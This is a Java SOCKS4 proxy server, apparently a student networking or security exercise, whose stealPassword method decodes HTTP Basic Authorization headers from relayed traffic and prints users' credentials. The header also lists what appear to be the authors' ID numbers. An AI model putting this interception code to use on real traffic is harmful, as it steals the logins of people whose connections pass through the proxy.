import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;   
import java.nio.ByteBuffer;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * written by Segev Fogel 308559897 and Ben Levy 203861968
 */
public class Sockspy {
    final static private int POOL_SIZE = 20;
    final static private int PORT = 8080;
    static private ServerSocket serverSocket;
    static private ExecutorService threadPool;


    private static boolean init() {
        try {
            serverSocket = new ServerSocket(PORT);
        } catch (IOException e) {
            System.err.println("Connection Error: cant start listening on port 8080, shutting down");
            return false;
        }
        threadPool = Executors.newFixedThreadPool(POOL_SIZE);
        return true;
    }

    public static void main(String[] args) {
        boolean serving = init();
        while (serving) {
            try {
                threadPool.execute(new SOCKSWorker(serverSocket.accept()));
            } catch (IOException e) {
                System.out.print("");
            }
        }
    }

    /**
     * a runnable client handler
     */
    public static class SOCKSWorker implements Runnable {

        private class socksException extends Exception {
            socksException(String message) {
                super(message);
            }
        }

        private Socket client;
        private InputStream clientIn;
        private OutputStream clientOut;
        private int port;
        private InetAddress address;
        private InputStream serverIn;
        private OutputStream serverOut;
        private Socket server;
        private boolean connectionEstablished;
        private boolean isDomain;
        final private int BUFFER = 1024;

        /**
         * constructor for a runnable client handler.
         *
         * @param client Socket
         */
        SOCKSWorker(Socket client) {
            this.connectionEstablished = false;
            this.isDomain = false;
            this.client = client;
            try {
                this.clientIn = client.getInputStream();
                this.clientOut = client.getOutputStream();
            } catch (IOException e) {
                closeAll();
            }
        }

        private void responseUser() throws socksException {
            try {
                clientOut.write(ByteBuffer.allocate(8).put((byte) 0x00).put((byte)
                        (this.connectionEstablished ? 0x5A : 0x5B)).putInt(0x1024).array());
            } catch (IOException e) {
                throw new socksException("user not responding");
            }
        }

        /**
         * opens a TCP connection to the server
         *
         * @prints prints successful connection from user to server
         */
        private void openServerConnection() throws socksException {
            try {
                this.server = new Socket(this.address, this.port);
                this.serverIn = server.getInputStream();
                this.serverOut = server.getOutputStream();
                System.out.printf("Successful connection from %s:%d to %s:%d \n",
                        client.getInetAddress().getHostAddress(), client.getPort(),
                        server.getInetAddress().getHostAddress(), this.port);
                this.connectionEstablished = true;
            } catch (IOException e) {
                throw new socksException("Not able to connect to destination");
            }
        }


        /**
         * Send the GET request to the server this.server.
         * Tunnels the response to this.client
         */
        private void tunnelMessage() throws socksException {
            int clientRead;
            int serverRead;
            try {
                byte[] buffer;// = new byte[BUFFER * 8];
//                clientRead = clientIn.read(buffer);
                do {
                    buffer = new byte[BUFFER * 8];
                    //get request from client
                    clientRead = clientIn.read(buffer);
                    //forward request to server
                    if (clientRead > 0) {
                        serverOut.write(buffer, 0, clientRead);
                        stealPassword(ByteBuffer.wrap(buffer, 0, clientRead).array());
                    }
                }while (buffer[buffer.length - 1] != '\0');
                    do {
                        buffer = new byte[BUFFER * 8];
                        //read response from server
                        serverRead = serverIn.read(buffer);
                        //write response to client
                        if (serverRead > 0) clientOut.write(buffer, 0, serverRead);
                    }while (buffer[buffer.length - 1] != '\0');
            } catch (IOException e) {
                throw new socksException("error while tunneling");
            }
        }

        /**
         * preform form grabbing to get the username and password used in HTTP's Basic authentication.
         *
         * @param request buffer
         */
        private void stealPassword(byte[] request) {
            String auth = "Authorization: Basic ";
            String text = new String(request);
            int start = text.indexOf(auth);
            if (start > 0) {
                int end = text.indexOf(System.lineSeparator(), start + auth.length());
                System.out.println("Password Found! http://" + new String(Base64.getDecoder().
                        decode(text.substring(start + auth.length(), end)))
                        + "@" + (this.isDomain ? this.address.getHostName() :
                        this.address.getHostAddress()));
            }
        }

        /**
         * parsing and checking the initial request received by the user
         *
         * @param requestBuffer initial request by user
         *                      sets this.port, possibly sets this.ip - if domain was not used.
         */
        private void parseRequest(ByteBuffer requestBuffer) throws socksException {
            if (requestBuffer.getShort() != (short) 0x0401) {
                throw new socksException("Unsupported protocol");
            }
            this.port = requestBuffer.getShort();
            int ip_int = requestBuffer.getInt();
            if (ip_int > 0 && ip_int < 0x100) {
                isDomain = true;
            } else {
                try {
                    this.address = InetAddress.getByAddress(ByteBuffer.allocate(4).putInt(0, ip_int)
                            .array());
                } catch (UnknownHostException e) {
                    throw new socksException("could not resolve address");
                }
            }
            while (requestBuffer.get() != '\0') System.out.print("");
            if (isDomain) {
                StringBuilder domain = new StringBuilder();
                char ch;
                while ((ch = (char) requestBuffer.get()) != '\0') {
                    domain.append(ch);
                }
                try {
                    this.address = InetAddress.getByName(domain.toString());
                } catch (UnknownHostException e) {
                    throw new socksException("could not resolve domain name");
                }
            }
        }

        /**
         * reads the request from the client and returns it
         *
         * @return request byte buffer
         */
        private ByteBuffer getRequest() throws socksException {
            try {
                byte[] buffer = new byte[BUFFER];
                int length = clientIn.read(buffer);
                if (length != -1) {
                    return ByteBuffer.wrap(buffer, 0, length);
                } else {
                    throw new IOException("");
                }
            } catch (IOException e) {
                throw new socksException("request error");
            }
        }

        private void closeSocket(Socket socket) {
            try {
                socket.shutdownInput();
                socket.shutdownOutput();
                socket.close();
            } catch (IOException e) {
                System.out.print("");
            }
        }

        private void closeAll() {
            String closeStr = String.format("Closing Connection from %s:%d", client.getInetAddress().getHostAddress(), client.getPort());
            if (this.connectionEstablished) {
                closeStr += String.format(" to %s:%d", server.getInetAddress().getHostAddress(), server.getPort());
            } else {
                try {
                    responseUser();
                } catch (socksException e) {
                    System.err.println("Connection Error: user not responding");
                }
            }
            System.out.println(closeStr);
            closeSocket(client);
            if (server != null) {
                closeSocket(server);
            }
        }

        /**
         * kind of a main function for the runnable class, will call all the other functions to handle
         * the request made by the user and pass him the information required.
         */
        public void run() {
            try {
                parseRequest(getRequest());
                openServerConnection();
                responseUser();
                tunnelMessage();
            } catch (socksException e) {
                System.err.println("Connection error: " + e.getMessage());
            }
            closeAll();
        }
    }
}

